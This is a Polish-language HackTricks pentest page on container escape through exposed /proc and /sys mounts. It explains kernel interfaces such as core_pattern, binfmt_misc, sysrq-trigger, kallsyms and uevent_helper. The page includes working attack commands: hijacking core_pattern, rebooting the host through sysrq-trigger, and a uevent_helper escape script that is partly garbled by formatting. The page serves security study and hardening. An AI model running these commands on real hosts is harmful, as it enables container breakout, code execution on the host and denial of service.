# Wrażliwe montowania

{% hint style="success" %}
Dowiedz się i ćwicz hakowanie AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i ćwicz hakowanie GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Ujawnienie `/proc` i `/sys` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczne ryzyko bezpieczeństwa, w tym zwiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które w przypadku niewłaściwej konfiguracji lub dostępu przez nieuprawnionego użytkownika mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczenia informacji ułatwiających dalsze ataki. Na przykład niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor ze względu na swoją ścieżkową naturę, pozostawiając `/host/proc` bez ochrony.

**Możesz znaleźć dalsze szczegóły dotyczące każdej potencjalnej luki w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilities procfs

### `/proc/sys`

Ten katalog umożliwia dostęp do modyfikacji zmiennych jądra, zazwyczaj za pomocą `sysctl(2)`, i zawiera kilka podkatalogów wymagających uwagi:

#### **`/proc/sys/kernel/core_pattern`**

* Opisany w [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Pozwala zdefiniować program do wykonania podczas generowania pliku rdzenia z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
*   **Przykład testowania i eksploatacji**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test dostępu do zapisu
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Ustawianie niestandardowego obsługującego
sleep 5 && ./crash & # Wywołanie obsługującego
```

#### **`/proc/sys/kernel/modprobe`**

* Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Zawiera ścieżkę do ładowacza modułów jądra, wywoływanego do ładowania modułów jądra.
*   **Przykład sprawdzania dostępu**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdź dostęp do modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Odniesienie w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Globalna flaga kontrolująca, czy jądro ma panikować czy wywoływać zabójcę OOM, gdy wystąpi warunek OOM.

#### **`/proc/sys/fs`**

* Zgodnie z [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), zawiera opcje i informacje o systemie plików.
* Dostęp do zapisu może umożliwić różne ataki typu odmowa usługi przeciwko hostowi.

#### **`/proc/sys/fs/binfmt_misc`**

* Umożliwia rejestrację interpretów dla formatów binarnych niezgodnych z systemem.
* Może prowadzić do eskalacji uprawnień lub uzyskania dostępu do powłoki root, jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny.
* Związany exploit i wyjaśnienie:
* [Rootkit typu poor man's za pomocą binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Wideo tutorial: [Link do wideo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Inne w `/proc`

#### **`/proc/config.gz`**

* Może ujawnić konfigurację jądra, jeśli `CONFIG_IKCONFIG_PROC` jest włączony.
* Przydatne dla atakujących do identyfikacji podatności w działającym jądrze.

#### **`/proc/sysrq-trigger`**

* Umożliwia wywoływanie poleceń Sysrq, potencjalnie powodując natychmiastowe ponowne uruchomienia systemu lub inne krytyczne działania.
*   **Przykład ponownego uruchamiania hosta**:

```bash
echo b > /proc/sysrq-trigger # Ponowne uruchomienie hosta
```

#### **`/proc/kmsg`**

* Ujawnia komunikaty z bufora pierścieniowego jądra.
* Może pomóc w eksploatacji jądra, ujawnianiu adresów i dostarczaniu wrażliwych informacji systemowych.

#### **`/proc/kallsyms`**

* Wyświetla eksportowane symbole jądra i ich adresy.
* Istotne dla rozwoju eksploitów jądra, zwłaszcza do pokonywania KASLR.
* Informacje o adresie są ograniczone, gdy `kptr_restrict` jest ustawione na `1` lub `2`.
* Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Interfejsuje z urządzeniem pamięci jądra `/dev/mem`.
* Historycznie podatny na ataki eskalacji uprawnień.
* Więcej na temat [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Reprezentuje pamięć fizyczną systemu w formacie rdzenia ELF.
* Odczytanie może ujawnić zawartość pamięci hosta i innych kontenerów.
* Duży rozmiar pliku może prowadzić do problemów z odczytem lub awarii oprogramowania.
* Szczegółowe użycie w [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Alternatywny interfejs dla `/dev/kmem`, reprezentujący pamięć wirtualną jądra.
* Umożliwia odczytywanie i zapisywanie, co umożliwia bezpośrednią modyfikację pamięci jądra.

#### **`/proc/mem`**

* Alternatywny interfejs dla `/dev/mem`, reprezentujący pamięć fizyczną.
* Umożliwia odczytywanie i zapisywanie, modyfikacja całej pamięci wymaga rozwiązania adresów wirtualnych na fizyczne.

#### **`/proc/sched_debug`**

* Zwraca informacje o harmonogramowaniu procesów, omijając zabezpieczenia przestrzeni nazw PID.
* Ujawnia nazwy procesów, identyfikatory PID i grupy cgroup.

#### **`/proc/[pid]/mountinfo`**

* Udostępnia informacje o punktach montowania w przestrzeni nazw montowania procesu.
* Ujawnia lokalizację `rootfs` kontenera lub obrazu. 

### Vulnerabilities `/sys`

#### **`/sys/kernel/uevent_helper`**

* Używany do obsługi `uevent` urządzenia jądra.
* Zapisywanie do `/sys/kernel/uevent_helper` może uruchamiać arbitralne skrypty po wyzwaleniu `uevent`.
*   **Przykład eksploatacji**: %%%bash

#### Tworzy ładunek

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Znajduje ścieżkę hosta z montowania OverlayFS dla kontenera

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Ustawia uevent\_helper na złośliwego pomocnika

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Wywołuje uevent

echo change > /sys/class/mem/null/uevent

#### Odczytuje wynik

cat /output %%%
#### **`/sys/class/thermal`**

* Kontroluje ustawienia temperatury, potencjalnie powodując ataki typu DoS lub fizyczne uszkodzenia.

#### **`/sys/kernel/vmcoreinfo`**

* Wycieka adresy jądra, potencjalnie kompromitując KASLR.

#### **`/sys/kernel/security`**

* Zawiera interfejs `securityfs`, umożliwiający konfigurację modułów bezpieczeństwa Linuxa, takich jak AppArmor.
* Dostęp może umożliwić kontenerowi wyłączenie swojego systemu MAC.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

* Ujawnia interfejsy do interakcji z zmiennymi EFI w NVRAM.
* Niewłaściwa konfiguracja lub eksploatacja może prowadzić do zablokowania laptopów lub niemożliwości uruchomienia hostów.

#### **`/sys/kernel/debug`**

* `debugfs` oferuje interfejs debugowania "bez zasad" do jądra.
* Historia problemów związanych z bezpieczeństwem związana z jego nieograniczonym charakterem.

### References

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Naucz się i ćwicz hakowanie AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz się i ćwicz hakowanie GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
